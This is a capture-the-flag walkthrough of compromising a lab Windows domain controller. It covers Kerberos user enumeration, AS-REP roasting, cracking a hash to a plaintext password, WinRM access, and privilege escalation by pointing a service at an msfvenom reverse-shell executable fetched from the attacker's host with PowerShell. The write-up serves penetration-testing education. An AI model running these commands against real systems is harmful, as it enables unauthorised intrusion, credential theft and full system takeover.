Services

Target IP: 10.10.71.79
Challenge Description:

Reconnaissance


Performing a port scan, using the command sudo nmap -sS 10.10.71.79 -p- -Pn, against the target machine shows it is running Active Directory service, as shown above. There are plenty of TCP ports open on the target machine. According to the scan, there are applications like HTTP, SMB, and even RDP open.


Using crackmapexec and the command crackmapexec smb 10.10.71.79, I identified the OS running on the target machine. The target seems to be running Windows 10.0 Build 17763 x64. The domain name, services.local, is also crucial. I can put this hostname inside my /etc/hosts file to perform further enumeration.


I inserted the services.local inside my /etc/hosts file, as shown above. I tried scanning the target machine using enum4linux tool, but I did not find anything useful. Time to enumerate the different applications now.

Enumeration

Port 80: HTTP

The default webpage above is displayed for this port application.


While enumerating the web application, I came across the webpage above. This webpage contains the full name of the team members. These names might be useful when testing for valid usernames. I also found the naming convention used by the organisation, as shown above. The username j.doe@services.local sounds interesting.


I created a file with the name usernames. This file contains the possible usernames as shown above. Time to try kerbrute to find valid usernames against the target machine.


And it looks like all four usernames are valid, as shown above. But I do not have their passwords. To discover this, I used the command kerbrute userenum --dc services.local -d services.local usernames. I do not know their password policy either, so using bruteforce would be dangerous as it could lead to account lockouts. Time to check if the users are ASReproastable.

Exploitation


And bingo! It looks like the user j.rock@services.local is vulnerable to ASREP roast, as I obtained their password hash via the ticket. The Kerberos preauthentication is disabled for this user. Meaning, I can crack the password of this user via the password hash as shown above. I copied the hash to a file called hash on my machine.


Using the command hashcat hash -m 18200 /usr/share/wordlists/rockyou.txt, I managed to crack the password hash of the user j.rock@services.local as shown above. I obtained the password Serviceworks1. Now I have the credentials j.rock@services.local:Serviceworks1. Maybe I can test it against the RDP on port 3389?


I noticed the SMB is not responding. I also tried to RDP into the target machine via port 3389, but I had no luck. However, now I have a shell on the target machine as the user j.rock using evil-winrm. The command I used is evil-winrm -u j.rock@services.local -p Serviceworks1 -i services.local.

Privilege Escalation


Running the command net user j.rock /domain shows the interesting result above. This user belongs to the group Server Operators. I can use this vector to elevate my privileges if there are any vulnerable services with write privileges on the target machine.


Running the command services shows the services on the target machine. I will choose the cfn-hup service.


Using the command msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.55.153 LPORT=8443 -f exe -o winhup.exe, I created a malicious Windows reverse shell in executable format. The name of this file is winhup.exe as I will be replacing the winhup.exe executable file for cfn-hup service. I also started a Python HTTP server on the same directory as this malicious file using the command python3 -m http.server 8080. Time to serve this file to the target machine. To catch the reverse shell, I started a listener on my machine at port 8443.


Using the command powershell -c 'iwr -uri http://10.14.55.153:8080/winhup.exe -Outfile winhup.exe', I downloaded the malicious file from my machine on the target machine at the user's Desktop. Then I used the following commands to replace the service executable file with my malicious file:

  • sc.exe config cfn-hup binPath="C:\Users\j.rock\Desktop\winhup.exe" to change the path of the binary executable file.
  • sc.exe stop cfn-hup to stop the service.
  • sc.exe start cfn-hup to start the service after modifying the path of the binary.


And bingo! Now I have a system access shell on the target machine via my machine at port 8443. GG.

Flags
